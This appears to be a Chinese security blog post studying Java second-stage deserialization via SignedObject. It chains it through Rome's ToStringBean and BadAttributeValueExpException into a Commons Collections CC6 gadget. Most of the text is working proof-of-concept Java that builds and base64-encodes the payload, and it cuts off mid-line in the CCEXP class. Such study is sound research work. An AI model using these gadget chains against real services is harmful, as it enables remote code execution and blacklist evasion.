{"title":"Java二次反序列化学习","uid":"9eef0bafd340d6fd0d85cf5145bacfba","slug":"Java二次反序列化","date":"2024-06-04T06:00:00.000Z","updated":"2024-06-28T15:09:08.329Z","comments":true,"path":"api/articles/Java二次反序列化.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecfe7b6094.webp","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>二次反序列化大多数时候是用来绕过黑名单或者解决不出网的问题，不会作为一条单独且完整的利用链存在，而是作为一个中间节点，用来绕过。<br>二次反序列化一般来说有如下几个常用的利用类</p>\n<ol>\n<li>SignedObject</li>\n<li>RMIConnector</li>\n<li>WrapperConnectionPoolDataSource</li>\n</ol>\n<p>最后一个在学习 C3P0 链的时候见的很多了，其余两个都没啥印象，一个一个来学习</p>\n<h1 id=\"SignedObject\"><a href=\"#SignedObject\" class=\"headerlink\" title=\"SignedObject\"></a>SignedObject</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717374318084-6a63d77e-6954-433b-a99a-9911799c263c.png#averageHue=%23323539&clientId=uff4c99cd-fd4e-4&from=paste&height=263&id=ucff3cf3a&originHeight=493&originWidth=837&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=136316&status=done&style=none&taskId=u8500afda-492b-41cd-9313-baf99e0d53c&title=&width=446.4\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>我们主要看方法 getObject 的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717374358233-c7471960-c5b3-4673-be15-99f65bc012d7.png#averageHue=%232b2c2e&clientId=uff4c99cd-fd4e-4&from=paste&height=262&id=uddec663e&originHeight=492&originWidth=1402&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=168462&status=done&style=none&taskId=u18d2b2d4-c186-460a-beac-97edc992f8b&title=&width=747.7333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>很正常的反序列化逻辑，创建字节输入流之后，加入对象输入流，之后对对象输入流调用 readObject 方法进行反序列化。序列化数据传入的参数也是可控的，实例化的时候赋值参数即可<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717374682476-dfa15149-4145-49d7-9b39-65c6e26ca8f8.png#averageHue=%23292b2c&clientId=uff4c99cd-fd4e-4&from=paste&height=415&id=uca0c49fd&originHeight=779&originWidth=1464&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=265124&status=done&style=none&taskId=uf233bef7-86da-48f1-8225-e7cb4302b89&title=&width=780.8\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这么一套下来感觉 SignedObject 是一个完美的二次反序列化媒介，他参数可控，并且能够包含一个 serializeObject，并将其反序列化。<br>现在的问题是如何调用到 SignedObject 的 getObject 方法呢？首先想到的肯定是 fastjson 和 jackson。但是这里的SignedObject 的 getter 方法并不符合 Fastjson 中对于获取 getter 方法的条件。SignedObject 中并没有直接定义 Object 属性值。所以得想另一个—<strong>Rome 反序列化</strong></p>\n<h2 id=\"Rome\"><a href=\"#Rome\" class=\"headerlink\" title=\"Rome\"></a>Rome</h2><h3 id=\"toStringBean\"><a href=\"#toStringBean\" class=\"headerlink\" title=\"toStringBean\"></a>toStringBean</h3><p>Rome 中获取 getter 方法并调用的逻辑有两处地方，ToStringBean 的有参 toString 方法，Equalsbean 的beanEquals 方法<br>在 rome 反序列化中我们就能够获取到类中的 getter 方法。不过也有一点条件：1.必须是 getter 形式 2.必须是无参数的 getter 方法，这两点在具体的方法– 有参 toString 中体现是最终 invoke 前的一段 if 判断，有一个不满足就会直接跳过调用阶段<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717375607817-31fbd06b-f42b-4a6b-8f5a-d2c8fcdbcd72.png#averageHue=%2328292b&clientId=u048abd6d-f8a0-4&from=paste&height=503&id=u73f3382f&originHeight=944&originWidth=2286&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=372316&status=done&style=none&taskId=uefe39a6f-905b-4717-a6d7-e86716ba4af&title=&width=1219.2\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>显然我们的 SignedObject 符合要求。所以我们可以直接拼接到 Rome 一条完整的调用链中<br>比如说采用 BadAttributeValueExpException 的这一条（因为确实短），调用栈如下</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki one-dark-pro\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #E06C75\">SignedObject#</span><span style=\"color: #61AFEF\">getObject</span><span style=\"color: #E06C75\">()</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">ToStringBean#</span><span style=\"color: #61AFEF\">toString</span><span style=\"color: #E06C75\">(String)</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">ToStringBean#</span><span style=\"color: #61AFEF\">toString</span><span style=\"color: #E06C75\">()</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">BadAttributeValueExpException#</span><span style=\"color: #61AFEF\">readObject</span><span style=\"color: #E06C75\">()</span></span></code></pre></div><p>拼接之后，SignedObject 中的 this.content 就能够接任何的 readObject 入口的利用链了，比如采用CC6<br>那么我们的 POC 就可以构造出来了。</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki one-dark-pro\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C678DD\">package</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">org.example.</span><span style=\"color: #FFFFFF\">S</span><span style=\"color: #C678DD\">igned</span><span style=\"color: #FFFFFF\">O</span><span style=\"color: #C678DD\">bject</span><span style=\"color: #FFFFFF\">POC</span><span style=\"color: #C678DD\">s</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">com.sun.syndication.feed.impl.ObjectBean</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">com.sun.syndication.feed.impl.ToStringBean</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.ClassPool</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.CtClass</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.CtConstructor</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javax.management.BadAttributeValueExpException</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javax.xml.transform.Templates</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.*</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.lang.reflect.Field</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.SignedObject</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Base64</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Hashtable</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">public</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">class</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">SignedObjectPOC</span><span style=\"color: #E06C75\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">public</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> main</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75; font-style: italic\">args</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//获取CC6的入口HashMap</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">CCEXP</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">ccexp</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">CCEXP</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">KeyPairGenerator</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">kpg</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">KeyPairGenerator</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getInstance</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;DSA&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">kpg</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">initialize</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">1024</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">KeyPair</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">kp</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">kpg</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">generateKeyPair</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">SignedObject</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">signedObject</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">SignedObject</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ccexp</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getPayload</span><span style=\"color: #ABB2BF\">(), </span><span style=\"color: #E5C07B\">kp</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getPrivate</span><span style=\"color: #ABB2BF\">(),</span><span style=\"color: #E5C07B\">Signature</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getInstance</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;DSA&quot;</span><span style=\"color: #ABB2BF\">));</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//Rome</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ToStringBean</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">toStringBean</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ToStringBean</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">SignedObject</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">, signedObject);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">BadAttributeValueExpException</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">badAttributeValueExpException</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">BadAttributeValueExpException</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">123</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(badAttributeValueExpException,</span><span style=\"color: #98C379\">&quot;val&quot;</span><span style=\"color: #ABB2BF\">,toStringBean);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//执行序列化和反序列化操作，并且返回序列化数据用于后续的payload生成</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">bs</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">unSerial</span><span style=\"color: #ABB2BF\">(badAttributeValueExpException);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//输出序列化字节码的base64编码</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">Base64Encode</span><span style=\"color: #ABB2BF\">(bs);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> setFieldValue</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">obj</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">field</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">arg</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Field</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">f</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">obj</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getClass</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">getDeclaredField</span><span style=\"color: #ABB2BF\">(field);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setAccessible</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">true</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">set</span><span style=\"color: #ABB2BF\">(obj, arg);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #61AFEF\"> unSerial</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">o</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">bs</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">out</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectOutputStream</span><span style=\"color: #ABB2BF\">(bs);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">writeObject</span><span style=\"color: #ABB2BF\">(o);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectInputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">in</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">()));</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">readObject</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">close</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">return</span><span style=\"color: #ABB2BF\"> bs;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> Base64Encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">bs</span><span style=\"color: #ABB2BF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">byte</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75\">encode</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Base64</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getEncoder</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">s</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">String</span><span style=\"color: #ABB2BF\">(encode);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(s);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">System</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">println</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">s</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">length</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">&#125;</span></span></code></pre></div><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki one-dark-pro\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C678DD\">package</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">org.example.</span><span style=\"color: #FFFFFF\">S</span><span style=\"color: #C678DD\">igned</span><span style=\"color: #FFFFFF\">O</span><span style=\"color: #C678DD\">bject</span><span style=\"color: #FFFFFF\">POC</span><span style=\"color: #C678DD\">s</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.ClassPool</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.CtClass</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">javassist.CtConstructor</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.Transformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.ChainedTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.ConstantTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.InvokerTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.map.LazyMap</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.lang.reflect.Field</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.HashMap</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.Map</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">public</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">class</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">CCEXP</span><span style=\"color: #E06C75\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">public</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #61AFEF\"> getPayload</span><span style=\"color: #ABB2BF\">()</span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Transformer</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75\">transformers</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Transformer</span><span style=\"color: #ABB2BF\">[]&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">                </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ConstantTransformer</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Runtime</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">),</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">                </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: 